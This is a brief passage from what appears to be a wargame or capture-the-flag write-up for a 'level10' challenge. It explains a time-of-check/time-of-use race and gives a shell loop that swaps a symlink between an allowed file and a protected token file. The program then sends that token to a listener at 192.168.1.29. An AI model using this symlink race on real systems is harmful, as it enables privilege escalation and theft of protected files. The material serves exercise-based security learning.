...
# The program check the permission on the file before connecting to the client
#
# The goal is to change the file while the program is connecting to the listener (6969)
#
# So we create a loop that swap the file (using & to execute it in a fork)
#
# And after that we send the password to the listener

SSH 1

> while true; do  ln -fs ~/level10 /tmp/test & ln -fs ~/token /tmp/test & ./level10 /tmp/test 192.168.1.29; done
